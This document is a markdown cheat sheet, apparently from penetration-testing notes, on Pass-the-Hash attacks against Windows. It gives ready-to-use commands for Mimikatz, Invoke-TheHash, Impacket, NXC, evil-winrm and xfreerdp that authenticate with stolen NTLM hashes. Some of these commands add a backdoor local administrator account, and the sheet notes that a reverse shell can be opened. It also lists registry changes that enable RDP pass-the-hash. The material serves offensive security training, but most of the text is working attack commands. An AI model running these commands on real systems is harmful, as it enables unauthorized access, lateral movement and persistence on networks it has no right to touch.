### Content

- [Overview](#overview)
- [From Windows](#from-windows)
	- [Using Mimikatz](#using-mimikatz)
	- [Using Invoke-TheHash](#using-invoke-thehash)
- [From Linux](#from-linux)
	- [Using Impacket](#using-impacket)
	- [Using NXC](#using-nxc)
	- [Using RDP](#using-rdp)

---
##### Overview

- [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication.
- The traditional pass-the-hash technique involves reusing a hash through the NTLMv1/NTLMv2 protocol, which doesn't touch Kerberos at all.

---
### From Windows
##### Using Mimikatz

``` powershell
c:\> mimikatz.exe privilege::debug "sekurlsa::pth /user:<name> /rc4:<MTLM hash> /domain:<> /run:cmd.exe" exit
```

- `/rc4` or `/NTLM` - NTLM hash of the user's password.
- `/domain` - Domain the user to impersonate belongs to.
	- For local user account, use the machine name, localhost or a dot (.).
- After executing the above command, another CMD window in the context of the target user will pop up.

##### Using Invoke-TheHash

- The tool can perform PtH with WMI and SMB through the .NET TCPClient.
- Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol.
- Admin privileges not required on client-side, but the user and hash we use to authenticate need to have admin privileges on the target.

``` powershell
# create a new user and add it to admins group
PS> Import-Module .\Invoke-TheHash.psd1
PS> Invoke-SMBExec -Target IP -Domain Domain -Username Name -Hash NTLM/NT:NTLM -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
# OR
PS> Invoke-WMIExec -Target IP -Domain Domain -Username Name -Hash NTLM/NT:NTLM -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

We can also get a reverse shell connection in the target machine.

``` powershell
PS> Invoke-WMIExec -Target <IP/Hostname> -Domain <domain> -Username <name> -Hash <hash> -Command "<Payload>"
```

---
### From Linux

###### Using Impacket

``` bash
# We can also use wmiexec, atexec amd smbexec from impacket
$ impacket-psexec USER@IP -hashes :<hash>
```

###### Using NXC

``` bash
# Validate the leaked creds using PtH
# Add --local-auth flag to try on the local user.
nxc smb <IP or Subnet> -u administrator -H <hash>
# To execute commands: `-x <command>`.
```

Using Evil-WinRm

``` bash
$ evil-winrm -i <IP> -u Administrator -H <hash>
# In case of using a domain account, include it, for example: administrator@domain
```

##### Using RDP

```bash
xfreerdp /v:<IP> /u:<username> /pth:<hash>
```

If the user is an Administrator and the `Restricted Admin Mode` is enable, (it's disabled by default). We can enable it by adding a new reg key `DisableRestrictedAdmin` with value of `0x0` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`.

  <img src="/assets/rdp_session-4.png" style="width:400;">


> [!Note]
> **UAC protection**:
> 
> UAC (User Account Control) limits local users' ability to perform remote administration operations. 
> 
> If `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` set to `0`:
> it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks.
> If set to `1`, it allows the other local admins as well.
> 
> **Exception**:
> The registry key `FilterAdministratorToken` (disabled by default).
> If its value is `1`, the RID 500 account (even if it is renamed) is enrolled in UAC protection.
> This means that remote PTH will fail against the machine when using that account.
> 
> These settings are only for local administrative accounts.
> If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer.

---
